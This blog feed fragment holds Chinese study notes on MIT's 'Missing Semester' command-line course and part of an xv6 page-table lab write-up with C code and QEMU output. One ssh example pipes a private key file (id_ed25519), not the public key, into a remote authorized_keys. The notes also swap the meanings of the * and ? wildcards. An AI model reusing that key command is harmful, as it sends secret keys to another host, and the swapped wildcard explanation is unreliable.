echo 前尝试打开 brightness 文件并写入，但是系统拒绝了 shell 的操作因为此时 shell 不是根用户</li><li>一个正确的做法：<code>echo 3 | sudo tee brightness</code></li></ul></li></ul><h1 id="Shell-Scripting"><a href="#Shell-Scripting" class="headerlink" title="Shell Scripting"></a>Shell Scripting</h1><p>shell脚本与其他脚本语言不同之处在于，针对 shell 所从事的相关工作进行来优化:</p><ul><li>创建命令流程（pipelines）</li><li>将结果保存到文件</li><li>从标准输入中读取输入</li></ul><p>以上这些都是 shell 脚本中的原生操作，这让它比通用的脚本语言更易用</p><ul><li><code>#</code> 后的内容会被注释</li><li>shell脚本的第一行如果出现了<code>#!/bin/bash</code>，说明这个脚本将会被bash执行，而不是zsh之类的别的shell</li><li><code>chmod +x xxx.sh</code>赋予可执行权限</li><li><code>./xxx.sh</code>会执行xxx.sh这个脚本，不可以直接写上xxx.sh，否则会在PATH里面找有没有交xxx.sh的</li><li>bash赋值语法为<code>foo=bar</code>，表示将bar赋值给foo，假设写为<code>foo = bar</code>，表示将=和bar当做foo的两个参数（在shell脚本中使用空格会起到分割参数的作用，有时候可能会造成混淆）</li><li>Bash中的字符串通过’ 和 “分隔符来定义，前者定义的字符串为原意字符串，其中的变量不会被转义，而后者将会对变量值进行替换<ul><li>单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的</li><li>双引号里可以有变量与转义字符</li></ul></li><li>和其他大多数的编程语言一样，bash也支持if, case, while 和 for 这些控制流关键字、函数，一个函数的例子：<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mcd</span> () &#123;<br>  <span class="hljs-attribute">mkdir</span> -p <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> <span class="hljs-comment"># $1表示脚本的第一个参数</span><br>  cd <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li>bash使用许多特殊的变量来表示参数、错误代码和相关变量：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$0</span> - 脚本名<br><span class="hljs-variable">$1</span> 到 <span class="hljs-variable">$9</span> - 脚本的参数。 <span class="hljs-variable">$1</span> 是第一个参数，依此类推。** 注意，<span class="hljs-variable">$10</span> 不能获取第十个参数，获取第十个参数需要<span class="hljs-variable">$</span>&#123;<span class="hljs-number">10</span>&#125;。当n&gt;=<span class="hljs-number">10</span>时，需要使用<span class="hljs-variable">$</span>&#123;n&#125;来获取参数。 **<br><span class="hljs-variable">$</span><span class="hljs-selector-tag">@</span> - 所有参数<br><span class="hljs-variable">$</span><span class="hljs-comment"># - 参数个数</span><br><span class="hljs-variable">$</span>? - 前一个命令的返回值<br><span class="hljs-variable">$</span><span class="hljs-variable">$</span> - 当前脚本的进程识别码<br>!! - 完整的上一条命令，包括参数。常见应用：当你因为权限不足执行命令失败时，可以使用 sudo !!再尝试一次。<br><span class="hljs-variable">$_</span> - 上一条命令的最后一个参数。如果你正在使用的是交互式 shell，你可以通过按下 Esc 之后键入 . 来获取这个值。<br></code></pre></td></tr></table></figure></li><li><code>&lt;(...)</code>被称为程序替换（progress substitution），它可以将命令输出转化为diff命令可以读取的类文件对象，因此<code>diff &lt;(ls foo) &lt;(ls bar)</code> 会显示文件夹 foo 和 bar 中文件的区别</li><li>通配符*和？,分别表示匹配单个和匹配所有。对于文件foo, foo1, foo2, foo10 和 bar, rm foo?这条命令会删除foo1 和 foo2 ，而rm foo* 则会删除除了bar之外的所有文件。</li><li>可以使用 <a href="https://www.shellcheck.net/">https://www.shellcheck.net/</a> 来检测shell脚本的错误</li><li>可以使用 <a href="https://explainshell.com/">https://explainshell.com/</a>  来分析shell脚本的功能</li><li>花括号{} - 当你有一系列的指令，其中包含一段公共子串时，可以用花括号来自动展开这些命令<ul><li><code>cp /path/to/project/&#123;foo,bar,baz&#125;.sh /newpath </code>会展开为<code>cp /path/to/project/foo.sh /path/to/project/bar.sh /path/to/project/baz.sh /newpath</code></li><li><code>mv *&#123;.py,.sh&#125; folder</code>会移动所有 *.py 和 *.sh 文件</li><li>下面命令会创建<code>foo/a, foo/b, ... foo/h, bar/a, bar/b, ... bar/h</code>这些文件：<code>touch &#123;foo,bar&#125;/&#123;a..h&#125;</code></li></ul></li><li>查找文件：<code>find</code>命令、<code>fd</code>（github上对于find命令的替代的开源项目）、locate命令</li></ul><h1 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h1><p>Vim的哲学：</p><ul><li>Vim可编程（可以使用 Vimscript 或者像 Python 一样的其他程序语言））</li><li>Vim 的接口本身也是一个程序语言</li><li>Vim 避免了使用鼠标，减少了手指移动</li><li> Vim 是一个能跟上你思维速度的编辑器</li></ul><p>Vim的几个模式：</p><ul><li>正常（normal）模式：在文件中四处移动光标进行修改（启动后的默认模式）</li><li>插入（insert）模式：插入文本</li><li>替换（replace）模式：替换文本</li><li>可视化（visual）（一般，行，块）模式：选中文本块</li><li>命令（command）模式：用于执行命令</li><li>Vim会在左下角显示当前的模式</li></ul><blockquote><p>在不同的操作模式下，键盘敲击的含义也不同。比如，x 在插入模式会插入字母x，但是在正常模式 会删除当前光标所在的字母，在可视模式下则会删除选中文块。</p></blockquote><p><strong>一些需要记忆的命令：</strong></p><p><strong>移动：</strong></p><ul><li>基本移动: hjkl （左， 下， 上， 右）</li><li>词： w （下一个词）， b （词初）， e （词尾）</li><li>行： 0 （行初）， ^ （第一个非空格字符）， $ （行尾）</li><li>屏幕： H （屏幕首行）， M （屏幕中间）， L （屏幕底部）</li><li>翻页： Ctrl-u （上翻）， Ctrl-d （下翻）</li><li>文件： gg （文件头）， G （文件尾）</li><li>行数： :{行数}<CR> 或者 {行数}G ({行数}为行数)</li><li>杂项： % （找到配对，比如括号或者 /* */ 之类的注释对）</li><li>查找： f{字符}， t{字符}， F{字符}， T{字符}</li><li>查找/到 向前/向后 在本行的{字符}</li><li>, / ; 用于导航匹配</li><li>搜索: /{正则表达式}, n / N 用于导航匹配</li></ul><p><strong>编辑：</strong></p><ul><li>O / o 在之上/之下插入行</li><li>d{移动命令} 删除 {移动命令}</li><li>例如， dw 删除词, d$ 删除到行尾, d0 删除到行头。</li><li>c{移动命令} 改变 {移动命令}</li><li>例如， cw 改变词</li><li>比如 d{移动命令} 再 i</li><li>x 删除字符（等同于 dl）</li><li>s 替换字符（等同于 xi）</li><li>可视化模式 + 操作</li><li>选中文字, d 删除 或者 c 改变</li><li>u 撤销, <C-r> 重做</li><li>y 复制 / “yank” （其他一些命令比如 d 也会复制）</li><li>p 粘贴</li><li>更多值得学习的: 比如 ~ 改变字符的大小写</li></ul><p><a href="https://gls.show/p/4f2baa62/">https://gls.show/p/4f2baa62/</a></p><h1 id="Data-Wrangling"><a href="#Data-Wrangling" class="headerlink" title="Data Wrangling"></a>Data Wrangling</h1><ul><li>正则表达式</li><li>sed</li><li>awk</li></ul><h1 id="Command-line-Environment"><a href="#Command-line-Environment" class="headerlink" title="Command-line Environment"></a>Command-line Environment</h1><p><strong>进程与信号</strong></p><ul><li>信号机制可以进行进程间通信，比如当我们输入 Ctrl-C 时，shell 会发送一个SIGINT 信号到进程<ul><li>当一个进程接收到信号时，它会停止执行、处理该信号并基于信号传递的信息来改变其执行。就这一点而言，信号是一种软件中断</li></ul></li><li>SIGSTOP可以让进程暂停（ctrl+z），可以配合fg（前台继续）、bg（后台继续）恢复被暂停的工作<ul><li>后台进程仍然是终端进程的子进程，关闭终端后该进程也会被终止</li><li>为了防止上述事情，可以使用nohup运行程序，也可以使用disown（对于已运行的程序）</li></ul></li><li>jobs列出当前终端会话的尚未完成的全部任务，echo $!打印出最近的任务的pid</li><li>&amp;可以让程序在后台运行</li></ul><p><strong>终端多路复用</strong></p><p><strong>可见 <a href="https://gls.show/p/34c553/">计算机教育中缺失的一课——Tmux</a></strong></p><p>会话 - 每个会话都是一个独立的工作区，其中包含一个或多个窗口</p><ul><li>tmux 开始一个新的会话</li><li>tmux new -s NAME 以指定名称开始一个新的会话</li><li>tmux ls 列出当前所有会话</li><li>在 tmux 中输入 <C-b> d ，将当前会话分离</li><li>tmux a 重新连接最后一个会话。您也可以通过 -t 来指定具体的会话</li></ul><p>窗口 - 相当于编辑器或是浏览器中的标签页，从视觉上将一个会话分割为多个部分</p><ul><li><C-b> c 创建一个新的窗口，使用 <C-d>关闭</li><li><C-b> N 跳转到第 N 个窗口，注意每个窗口都是有编号的</li><li><C-b> p 切换到前一个窗口</li><li><C-b> n 切换到下一个窗口</li><li><C-b> , 重命名当前窗口</li><li><C-b> w 列出当前所有窗口<br>面板 - 像 vim 中的分屏一样，面板使我们可以在一个屏幕里显示多个 shell</li><li><C-b> “ 水平分割</li><li><C-b> % 垂直分割</li><li><C-b> &lt;方向&gt; 切换到指定方向的面板，&lt;方向&gt; 指的是键盘上的方向键</li><li><C-b> z 切换当前面板的缩放</li><li><C-b> [ 开始往回卷动屏幕。您可以按下空格键来开始选择，回车键复制选中的部分</li><li><C-b> &lt;空格&gt; 在不同的面板排布间切换</li></ul><p>别名</p><ul><li>alias可以给长命令取别名，比如alias ls=“ls -al;pwd”，注意到等号两遍没有空格</li><li>unalias禁用别名</li><li>为了让别名持续生效，需要把别名放到.bashrc等shell的启动文件中</li></ul><p>配置文件（Dotfile，点文件）</p><p>很多程序的配置都是有对应的配置文件的，以点开头，比如：</p><ul><li>bash - ~/.bashrc, ~/.bash_profile</li><li>git - ~/.gitconfig</li><li>vim - ~/.vimrc 和 ~/.vim 目录</li><li>ssh - ~/.ssh/config</li><li>tmux - ~/.tmux.conf</li></ul><p>配置文件可以方便移植，定制化等</p><p><strong>远程登录</strong></p><ul><li>ssh user@ip command可以以user的身份执行command</li><li>ssh可以配置免密登录</li><li>ssh-keygen命令可以生成一对rsa秘钥</li><li>ssh 会查询 .ssh/authorized_keys 来确认那些用户可以被允许登录，需要将公钥拷贝到此处</li><li>scp命令可以拷贝文件</li><li>rsync是scp的改进版，可以实现断点续传、防止重复拷贝等功能</li><li>编辑.ssh/config文件可以给给需要连接的远程服务器、用户取别名，简化命令</li></ul><p>拷贝公钥的两个命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">cat .ssh<span class="hljs-operator">/</span>id_ed25519 <span class="hljs-operator">|</span> ssh foobar<span class="hljs-variable">@remote</span> <span class="hljs-string">&#x27;cat &gt;&gt; ~/.ssh/authorized_keys&#x27;</span><br><br>ssh<span class="hljs-operator">-</span><span class="hljs-keyword">copy</span><span class="hljs-operator">-</span>id <span class="hljs-operator">-</span>i .ssh<span class="hljs-operator">/</span>id_ed25519.pub foobar<span class="hljs-variable">@remote</span><br></code></pre></td></tr></table></figure><h1 id="Version-Control-Git"><a href="#Version-Control-Git" class="headerlink" title="Version Control (Git)"></a>Version Control (Git)</h1><p>版本控制系统的作用：</p><ul><li>追踪项目的修改历史</li><li>查看某行代码编辑的时间和人</li><li>创建项目快照、多人合作、分支开发等</li></ul><p>Git的特点：</p><ul><li>Git 在储存数据时，所有的对象都会基于它们的 SHA-1 哈希 进行寻址</li><li>给这些哈希值赋予人类可读的名字，也就是引用（references），比如master 引用通常会指向主分支的最新一次提交</li><li>当前位置的索引：HEAD</li></ul><p>详细内容可以参考<a href="https://gls.show/p/3645f6a9/">https://gls.show/p/3645f6a9/</a></p><h1 id="Debugging-and-Profiling"><a href="#Debugging-and-Profiling" class="headerlink" title="Debugging and Profiling"></a>Debugging and Profiling</h1><blockquote><p>最有效的 debug 工具就是细致的分析，配合恰当位置的打印语句</p></blockquote><p>调试代码的方式：</p><ul><li><p>print大法好</p></li><li><p>日志，比如journalctl可以查询系统日志，可以配合正则进行匹配</p></li><li><p>可以通过彩色的终端输出更好的分析调试（需要终端的彩色配置）</p></li><li><p>lnav提供了易于查看的日志<br><img src="/image/lnav-front-page.png"></p></li><li><p>一些调试器：gdb、pwngdb、pdb</p></li><li><p>分析系统调用：strace</p></li><li><p>web开发：使用Chrome的开发者工具</p></li><li><p>python的 pycallgraph可以生成如下的调用图和流程图：<br><img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/A_Call_Graph_generated_by_pycallgraph.png"></p></li></ul><p>资源监控：</p><ul><li>htop，注意到一些快捷键的使用，比如<F6> 进程排序、 t 显示树状结构和 h 打开或折叠线程</li><li>glance</li><li>iotop可以显示实时 I/O 占用信息而且可以非常方便地检查某个进程是否正在执行大量的磁盘读写操作</li><li>df 可以显示每个分区的信息，而 du 则可以显示当前目录下每个文件的磁盘使用情况（ disk usage）。-h 选项可以使命令以对人类（human）更加友好的格式显示数据；ncdu是一个交互性更好的 du ，它可以让您在不同目录下导航、删除文件和文件夹</li><li>lsof 可以列出被进程打开的文件信息、查看文件是被哪个进程打开的</li></ul><h1 id="Metaprogramming"><a href="#Metaprogramming" class="headerlink" title="Metaprogramming"></a>Metaprogramming</h1><p>构建系统，以makefile为例</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">paper.pdf: paper.tex plot-data.png<br>pdflatex paper.tex<br><br>plot-%<span class="hljs-string">.png</span>: %<span class="hljs-string">.dat</span> plot.py<br><span class="hljs-string">./plot.py</span> -i $*<span class="hljs-string">.dat</span> -o $@<br></code></pre></td></tr></table></figure><ul><li>左侧是构建目标，右侧是构建目标所需要的依赖</li><li>缩进的部分是上述过程所需要的程序</li><li><code>%</code>会匹配左右两端相同的字符串<ul><li>如果目标是 plot-foo.png， make 会去寻找 foo.dat 和 plot.py 作为依赖</li></ul></li></ul><p>依赖管理</p><ul><li>语义版本号：主版本号.次版本号.补丁号，比如8.1.3</li><li>假设项目依赖A,A有版本B，那么只要B的主版本号和A相同，次版本号不低于A一般来说即可使用<ul><li> 如果我依赖的版本是1.3.7，那么使用1.3.8、1.6.1，甚至是1.3.0都是可以的。如果版本号是 2.2.4 就不一定能用</li></ul></li><li>锁文件（lock files）：锁文件列出了您当前每个依赖所对应的具体版本号，需要执行升级程序才能更新依赖的版本</li></ul><p>持续集成</p><ul><li>CI（continuous integration 持续集成）<ul><li><blockquote><p>本课程的网站基于 GitHub Pages 构建，这就是一个很好的例子。Pages 在每次master有代码更新时，会执行 Jekyll 博客软件，然后使您的站点可以通过某个 GitHub 域名来访问。对于我们来说这些事情太琐碎了，我现在我们只需要在本地进行修改，然后使用 git 提交代码，发布到远端。CI 会自动帮我们处理后续的事情。</p></blockquote></li><li>Git 可以作为一个简单的 CI 系统来使用，在任何 git 仓库中的 .git/hooks 目录中，您可以找到一些文件（当前处于未激活状态），它们的作用和脚本一样，当某些事件发生时便可以自动执行</li></ul></li></ul><h1 id="Security-and-Cryptography"><a href="#Security-and-Cryptography" class="headerlink" title="Security and Cryptography"></a>Security and Cryptography</h1><ul><li>散列函数<ul><li>密钥生成函数 (Key Derivation Functions) </li><li>文件的信息摘要(Message digest)</li><li>Git中的内容寻址存储(Content addressed storage)</li></ul></li><li>对称加密</li><li>非对称加密<ul><li>PGP电子邮件加密，公布公钥，实现电子邮件加密</li><li>软件签名，验证下载的软件</li></ul></li><li>密码管理器，比如keepass</li><li>两步验证</li><li>ssh（非对称签名来验证用户身份）<h1 id="Potpourri"><a href="#Potpourri" class="headerlink" title="Potpourri"></a>Potpourri</h1></li><li>修改键位映射<ul><li>Vim经常用到escape键但是太远了，因此可以将escape与caps键替换。通常这个功能由在计算机上运行的软件实现。当某一个按键被按下，软件截获键盘发出的按键事件（keypress event）并使用另外一个事件取代</li></ul></li><li>守护进程<ul><li>指后台持续运行的程序，一般以 d 结尾，比如 SSH 服务端 sshd，用来监听传入的 SSH 连接请求并对用户进行鉴权</li><li>systemd（（the system daemon）） 配置文件的详细指南可参见 freedesktop.org</li><li>定期运行程序可以使用cron</li></ul></li><li>计算机启动时，BIOS 或者 UEFI 会在加载操作系统之前对硬件系统进行初始化，这被称为引导（booting）。你可以通过按下计算机提示的键位组合来配置引导，比如 Press F9 to configure BIOS. Press F12 to enter boot menu</li><li>交互式记事本。比如Jupyter，它的名字来源于所支持的三种核心语言：Julia、Python、R（JuPyteR）</li><li>GitHub</li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MIT-6.S081：Lab3 page table</title>
    <link href="/p/c98013d5/"/>
    <url>/p/c98013d5/</url>
    
    <content type="html"><![CDATA[<h1 id="Lab3-pgtable"><a href="#Lab3-pgtable" class="headerlink" title="Lab3 pgtable"></a>Lab3 pgtable</h1><p>写在lab开始之前：</p><ul><li><del>这个lab很明显和前面不是一个难度</del></li><li>需要补充一些虚拟内存的知识<ul><li>看一下配套的xv6指导手册</li><li>B站的课程视频录播</li></ul></li></ul><h2 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h2><p>虚拟地址中间的index有27位，因此页表项就有<code>2^27</code>个，也即是<code>0~2^27-1</code>，将index对应的PPN取出和offset拼在一起就成了PA（physical address）</p><p>xv6 运行在 Sv39 RISC-V 上，这意味着只使用 64 位虚拟地址的底部 39 位，顶部 25 位未被使用。因此下面图中只需要关注低39位</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202304171551847.png"></p><p>刚刚是单级页表，但是出于一些考虑，xv6使用三级页表的映射方式</p><p>Q：3级page table为什么会比一个超大的page table更好呢？</p><blockquote><p>Frans教授：这是个好问题，这的原因是，3级page table中，大量的PTE都可以不存储。比如，对于最高级的page table里面，如果一个PTE为空，那么你就完全不用创建它对应的中间级和最底层page table，以及里面的PTE。所以，这就是像是在整个虚拟地址空间中的一大段地址完全不需要有映射一样。</p><p>3级page table就像是按需分配这些映射块3级page table就像是按需分配这些映射块</p></blockquote><p>对于页表的每一项的内容，<code>0~63</code>位如下</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202304171551739.png"></p><p>xv6中定义的一些宏如下，和pte作<code>与</code>运算之后可以得到页表的某一位，比如pte &amp; PTE_V可以得知页表是否有效</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTE_V (1L &lt;&lt; 0) <span class="hljs-comment">// valid 00001</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTE_R (1L &lt;&lt; 1) <span class="hljs-comment">// readable 00010</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTE_W (1L &lt;&lt; 2) <span class="hljs-comment">// writeable00100</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTE_X (1L &lt;&lt; 3) <span class="hljs-comment">// executable01000</span></span><br></code></pre></td></tr></table></figure><p>PA2PTE(pa)将虚拟地址右移截断12位之后再左移10位，可以得到对应的页表项</p><p>PTE2PA(pte)将页表项右移截断10位之后再左移12位，可以得到对应的虚拟地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PA2PTE(pa) ((((uint64)pa) &gt;&gt; 12) &lt;&lt; 10)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTE2PA(pte) (((pte) &gt;&gt; 10) &lt;&lt; 12)</span><br></code></pre></td></tr></table></figure><h2 id="Print-a-page-table"><a href="#Print-a-page-table" class="headerlink" title="Print a page table"></a>Print a page table</h2><p>在sh.c中加入代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Execute cmd.  Never returns.*</span><br>__attribute__((noreturn)) <br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">runcmd</span><span class="hljs-params">(struct cmd *cmd)</span> </span>&#123;<br>.....<br>&#125;<br></code></pre></td></tr></table></figure><p>这样做是为了防止报递归错</p><p>在exec.c中加入下面代码，以打印出进程1的页表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(p-&gt;pid==<span class="hljs-number">1</span>) <br>  vmprint(p-&gt;pagetable);<br><br><span class="hljs-keyword">return</span> argc; <span class="hljs-comment">// this ends up in a0, the first argument to main(argc, argv)</span><br><br></code></pre></td></tr></table></figure><p>在 kernel/defs.h 中定义 vmprint 的原型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// vm.c</span><br><span class="hljs-function"><span class="hljs-keyword">void</span>            <span class="hljs-title">vmprint</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span>            <span class="hljs-title">dfs_vmprint</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> ,<span class="hljs-keyword">int</span> )</span></span>;<br></code></pre></td></tr></table></figure><p>我们需要在vm.c中编写vmprint函数的代码</p><p>先观察一下给出的输出</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">page table 0x0000000087f6e000<br><span class="hljs-string">..0</span>: pte 0x0000000021fda801 pa 0x0000000087f6a000<br><span class="hljs-string">..</span> <span class="hljs-string">..0</span>: pte 0x0000000021fda401 pa 0x0000000087f69000<br><span class="hljs-string">..</span> <span class="hljs-string">..</span> <span class="hljs-string">..0</span>: pte 0x0000000021fdac1f pa 0x0000000087f6b000<br><span class="hljs-string">..</span> <span class="hljs-string">..</span> <span class="hljs-string">..1</span>: pte 0x0000000021fda00f pa 0x0000000087f68000<br><span class="hljs-string">..</span> <span class="hljs-string">..</span> <span class="hljs-string">..2</span>: pte 0x0000000021fd9c1f pa 0x0000000087f67000<br><span class="hljs-string">..255</span>: pte 0x0000000021fdb401 pa 0x0000000087f6d000<br><span class="hljs-string">..</span> <span class="hljs-string">..511</span>: pte 0x0000000021fdb001 pa 0x0000000087f6c000<br><span class="hljs-string">..</span> <span class="hljs-string">..</span> <span class="hljs-string">..510</span>: pte 0x0000000021fdd807 pa 0x0000000087f76000<br><span class="hljs-string">..</span> <span class="hljs-string">..</span> <span class="hljs-string">..511</span>: pte 0x0000000020001c0b pa 0x0000000080007000<br></code></pre></td></tr></table></figure><p>对该输出格式的几点解释：</p><ul><li>第一行格式是<code>page table %p</code>，%p是一级页表入口的地址，<code>pagetable[i]</code>就是一级页表第i项</li><li>第二行开始，是dfs的结果。从0到512进行循环，看pte是否有效，如果有效那么找到pte指向的下一个条目，直到找到叶子节点</li><li>顶级页表页面只有条目0和255的映射。条目0的下一个级别的页表只映射了索引0，而该索引0的底层则映射了条目0、1和2。顶级页表255同理</li></ul><p>先写出vmprint函数，把第一行打印出来，然后进入dfs循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> </span><br><span class="hljs-function"><span class="hljs-title">vmprint</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;page table %p\n&quot;</span>, pagetable);<br>  dfs_vmprint(pagetable, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>pte &amp; PTE_V</code>用来判断页表是否有效，如果有效就先将对应的所有信息打印出来</p><p><code>pte &amp; (PTE_R|PTE_W|PTE_X)) == 0</code>用来判断是否有下一级的页表，如果有的话，就将该pte转化为虚拟地址，进入递归</p><p>写这部分代码要仔细参考阅读源码中的freewalk函数，很有帮助</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs_vmprint</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable,<span class="hljs-keyword">int</span> level)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// there are 2^9 = 512 PTEs in a page table.</span><br>  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">512</span>; i++)&#123;<br>    <span class="hljs-keyword">pte_t</span> pte = pagetable[i];<br>    <span class="hljs-keyword">if</span>((pte &amp; PTE_V))&#123;<span class="hljs-comment">//只要有效就打印出来</span><br>      <span class="hljs-comment">// this PTE points to a lower-level page table.</span><br>      <br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;..&quot;</span>);<span class="hljs-comment">//输出..的格式控制</span><br>      <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;level;j++) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; ..&quot;</span>);<br>      <br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: pte %p pa %p\n&quot;</span>, i, pte, PTE2PA(pte));<span class="hljs-comment">//输出页表项信息</span><br>    <br>      <span class="hljs-keyword">if</span>((pte &amp; (PTE_R|PTE_W|PTE_X)) == <span class="hljs-number">0</span>)<span class="hljs-comment">//如果有下一级的页表</span><br>      &#123;<br>        uint64 child = PTE2PA(pte);<br>        dfs_vmprint((<span class="hljs-keyword">pagetable_t</span>)child, level+<span class="hljs-number">1</span>);<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> make qemu</span><br>qemu-system-riscv64 -machine virt -bios none -kernel kernel/kernel -m 128M -smp 3 -nographic -drive file=fs.img,if=none,format=raw,id=x0 -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0<br><br>xv6 kernel is booting<br><br>hart 2 starting<br>hart 1 starting<br>page table 0x0000000087f6e000<br>..0: pte 0x0000000021fda801 pa 0x0000000087f6a000<br>.. ..0: pte 0x0000000021fda401 pa 0x0000000087f69000<br>.. .. ..0: pte 0x0000000021fdac1f pa 0x0000000087f6b000<br>.. .. ..1: pte 0x0000000021fda00f pa 0x0000000087f68000<br>.. .. ..2: pte 0x0000000021fd9c1f pa 0x0000000087f67000<br>..255: pte 0x0000000021fdb401 pa 0x0000000087f6d000<br>.. ..511: pte 0x0000000021fdb001 pa 0x0000000087f6c000<br>.. .. ..510: pte 0x0000000021fdd807 pa 0x0000000087f76000<br>.. .. ..511: pte 0x0000000020001c0b pa 0x0000000080007000<br>init: starting sh<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><h2 id="A-kernel-page-table-per-process"><a href="#A-kernel-page-table-per-process" class="headerlink" title="A kernel page table per process"></a>A kernel page table per process</h2><p>Xv6只有一个内核页表，只要在内核中执行，就会使用它。内核页表是物理地址的直接映射，也即是内核虚拟地址 x 映射到物理地址 x。每个进程也会有自己的用户页表，该页表只包含此进程的用户空间的地址映射。而这些用户页表和用户地址在内核页表中是不存在的。因此就会出现一个问题：假设用户进程调用write系统调用并传递一个指针，由于该指针是用户级的地址，在内核中是无效的，因此实际过程中会先将用户级的虚拟地址转换为物理地址，这样就会造成一定程度的开销。本任务就是为了解决这个问题，让每个用户级的进程都有一个内核页表</p><p><strong>任务：修改内核，以便每个进程在内核中执行时使用其自己的内核页表副本</strong></p><p>我们自然想到要在 <code>struct proc</code>中加上进程的内核页表条目 